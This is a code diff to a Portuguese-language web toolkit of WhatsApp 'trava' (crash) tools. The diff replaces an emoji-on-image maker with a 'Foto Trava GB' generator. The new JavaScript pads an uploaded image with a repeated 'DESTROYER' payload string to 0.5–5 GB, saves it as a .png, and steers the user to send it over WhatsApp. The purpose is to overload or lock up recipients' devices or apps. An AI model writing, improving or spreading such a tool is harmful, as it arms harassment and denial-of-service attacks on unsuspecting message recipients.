@@ -601,15 +601,15 @@
                     </div>
                 </div>
 
-                <!-- Balão 4: Criador de Foto com Caracteres Embutidos -->
+                <!-- Balão 4: Criador de Foto Trava Gigabyte -->
                 <div class="carousel-card" onclick="openModal('modalFotoTrava')">
                     <div class="card-header-top">
-                        <span class="card-tag">FOTO TRAVA</span>
+                        <span class="card-tag">FOTO GB</span>
                         <span class="css-symbol symbol-balloon"></span>
                     </div>
                     <div class="card-content-bottom">
-                        <div class="card-label">Foto de Trava (Texto)</div>
-                        <div class="card-desc">Embutir caracteres e emojis na imagem</div>
+                        <div class="card-label">Foto Trava GB</div>
+                        <div class="card-desc">Modificar arquivo para pesar Gigabytes</div>
                     </div>
                 </div>
 
@@ -718,32 +718,39 @@
         </div>
     </div>
 
-    <!-- MODAL 4: FOTO DE TRAVA COM CARACTERES EMBUTIDOS -->
+    <!-- MODAL 4: FOTO TRAVA GIGABYTE -->
     <div class="modal-overlay" id="modalFotoTrava">
         <div class="modal-content" style="max-width: 450px;">
             <div class="modal-header">
-                <div class="modal-title">Embutir Caracteres na Foto</div>
+                <div class="modal-title">Modificador de Foto Trava (Gigabytes)</div>
                 <button class="modal-close" onclick="closeModal('modalFotoTrava')">&times;</button>
             </div>
             
             <div class="form-group">
-                <label class="form-label">1. Escolha a Imagem de Fundo</label>
-                <button class="action-btn" style="background: #334155; font-size: 0.85rem; padding: 10px;" onclick="document.getElementById('inputBaseImg').click()">Carregar Imagem Base</button>
+                <label class="form-label">1. Escolha a Imagem Base</label>
+                <button class="action-btn" style="background: #334155; font-size: 0.85rem; padding: 10px;" onclick="document.getElementById('inputBaseImg').click()">Selecionar Imagem</button>
             </div>
             <input type="file" id="inputBaseImg" accept="image/*" onchange="carregarImagemBase(event)">
 
             <div class="canvas-preview-box" id="canvasPreviewBox">
-                <span style="color: #64748b; font-size: 0.75rem; text-align: center; padding: 10px;">Prévia da Imagem Final Gerada</span>
+                <span style="color: #64748b; font-size: 0.75rem; text-align: center; padding: 10px;">Nenhuma imagem carregada</span>
             </div>
 
             <div class="form-group">
-                <label class="form-label">2. Insira os Caracteres / Emojis (Aceita qualquer trava pesada)</label>
-                <textarea class="form-textarea" id="inputTravaEmbutida" rows="3" placeholder="Cole aqui seus emojis ou caracteres de trava (ex: 💥💀⚠️)..." oninput="gerarImagemComTrava()"></textarea>
+                <label class="form-label">2. Escolha o Peso em Gigabytes (GB)</label>
+                <select class="form-input" id="selectPesoTrava">
+                    <option value="0.5">0.5 GB (500 Megabytes)</option>
+                    <option value="1" selected>1 Gigabyte (1 GB - Extremo)</option>
+                    <option value="2">2 Gigabytes (2 GB - Super Pesado)</option>
+                    <option value="5">5 Gigabytes (5 GB - Ultra Trava)</option>
+                </select>
             </div>
 
-            <div style="display: flex; gap: 10px;">
-                <button class="action-btn" style="flex: 1;" onclick="baixarFotoGerada()">Baixar Foto Pronta</button>
-                <button class="action-btn" style="flex: 1; background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="compartilharFotoGeradaWp()">Enviar no WhatsApp</button>
+            <div class="counter-badge" id="pesoEstimadoDisplay">Peso estimado: 0 GB</div>
+
+            <div style="display: flex; gap: 10px; margin-top: 5px;">
+                <button class="action-btn" style="flex: 1;" onclick="baixarFotoPesada()">Gerar e Baixar Foto GB</button>
+                <button class="action-btn" style="flex: 1; background: linear-gradient(135deg, #22c55e, #16a34a);" onclick="compartilharFotoPesadaWp()">Enviar no WhatsApp</button>
             </div>
         </div>
     </div>
@@ -920,75 +927,73 @@
             window.open(`https://api.whatsapp.com/send?text=${encodeURIComponent(travaSelecionadaAtual.conteudo)}`, '_blank');
         }
 
-        // --- MOTOR DE EMBUTIR CARACTERES/EMOJIS EM IMAGEM (CANVAS) ---
-        let imagemBaseObj = null;
-        let ultimaImagemGeradaUrl = null;
+        // --- MOTOR DE MODIFICAÇÃO DE ARQUIVO PESADO EM GIGABYTES ---
+        let arquivoImagemOriginal = null;
+        let blobFinalModificado = null;
 
         function carregarImagemBase(event) {
             const file = event.target.files[0];
             if (!file) return;
+            arquivoImagemOriginal = file;
+            
             const reader = new FileReader();
             reader.onload = function(e) {
-                const img = new Image();
-                img.onload = function() {
-                    imagemBaseObj = img;
-                    gerarImagemComTrava();
-                };
-                img.src = e.target.result;
+                document.getElementById('canvasPreviewBox').innerHTML = `<img src="${e.target.result}" style="width:100%; height:100%; object-fit:contain;">`;
+                atualizarDisplayPeso();
             };
             reader.readAsDataURL(file);
         }
 
-        function gerarImagemComTrava() {
-            const previewBox = document.getElementById('canvasPreviewBox');
-            const textoTrava = document.getElementById('inputTravaEmbutida').value;
+        document.getElementById('selectPesoTrava').addEventListener('change', atualizarDisplayPeso);
 
-            if (!imagemBaseObj) {
-                previewBox.innerHTML = '<span style="color: #64748b; font-size: 0.75rem; text-align: center; padding: 10px;">Carregue uma imagem base primeiro</span>';
-                return;
-            }
-
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-
-            // Definir proporções da imagem final
-            canvas.width = 800;
-            canvas.height = 800;
-
-            // Desenhar imagem de fundo esticada/centralizada
-            ctx.drawImage(imagemBaseObj, 0, 0, canvas.width, canvas.height);
-
-            // Se houver texto/emojis, aplicar camuflado ou visível na parte inferior/centralizada
-            if (textoTrava) {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.75)';
-                ctx.fillRect(0, canvas.height - 120, canvas.width, 120);
-
-                ctx.fillStyle = '#ffffff';
-                ctx.font = 'bold 24px sans-serif';
-                ctx.textBaseline = 'middle';
-
-                // Desenhar texto (aceita emojis e caracteres especiais)
-                ctx.fillText(textoTrava.substring(0, 100) + (textoTrava.length > 100 ? '...' : ''), 30, canvas.height - 60);
-            }
-
-            ultimaImagemGeradaUrl = canvas.toDataURL('image/png');
-            previewBox.innerHTML = `<img src="${ultimaImagemGeradaUrl}" style="width:100%; height:100%; object-fit:contain;">`;
+        function atualizarDisplayPeso() {
+            const gb = parseFloat(document.getElementById('selectPesoTrava').value) || 1;
+            document.getElementById('pesoEstimadoDisplay').innerText = `Peso Alvo: ${gb} GB`;
         }
 
-        function baixarFotoGerada() {
-            if (!ultimaImagemGeradaUrl) { alert('Gere a imagem com caracteres primeiro!'); return; }
+        async function baixarFotoPesada() {
+            if (!arquivoImagemOriginal) { alert('Selecione uma imagem primeiro!'); return; }
+
+            const gigabytes = parseFloat(document.getElementById('selectPesoTrava').value) || 1;
+            const tamanhoAlvoBytes = gigabytes * 1024 * 1024 * 1024; // Convertendo GB para Bytes
+
+            alert(`Gerando arquivo de ${gigabytes} GB... Isso pode levar alguns segundos dependendo do seu aparelho.`);
+
+            const arrayBufferOriginal = await arquivoImagemOriginal.arrayBuffer();
+            
+            // Bloco de enchimento massivo em string convertida para bytes
+            const stringPesada = "ZRX_DESTROYER_V5_GB_PAYLOAD_⚠️💥💀🔥⚡_".repeat(200000);
+            const encoder = new TextEncoder();
+            const chunkExtra = encoder.encode(stringPesada);
+
+            const partes = [arrayBufferOriginal];
+            let tamanhoAtual = arrayBufferOriginal.byteLength;
+
+            while (tamanhoAtual < tamanhoAlvoBytes) {
+                partes.push(chunkExtra);
+                tamanhoAtual += chunkExtra.byteLength;
+            }
+
+            blobFinalModificado = new Blob(partes, { type: arquivoImagemOriginal.type });
+            
+            const url = URL.createObjectURL(blobFinalModificado);
             const a = document.createElement('a');
-            a.href = ultimaImagemGeradaUrl;
-            a.download = 'ZRX_Trava_Foto.png';
+            a.href = url;
+            a.download = `ZRX_Foto_Trava_${gigabytes}GB.png`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            alert('Foto gerada em Gigabytes com sucesso e baixada!');
         }
 
-        function compartilharFotoGeradaWp() {
-            if (!ultimaImagemGeradaUrl) { alert('Gere a imagem com caracteres primeiro!'); return; }
-            baixarFotoGerada();
-            alert('Imagem salva no seu dispositivo! Agora abra o WhatsApp e envie esta foto na conversa.');
+        function compartilharFotoPesadaWp() {
+            if (!blobFinalModificado) { 
+                baixarFotoPesada();
+                return; 
+            }
+            alert('Arquivo pesado salvo! Abra o WhatsApp e envie o arquivo gerado.');
             window.open('https://api.whatsapp.com/', '_blank');
         }
     </script>
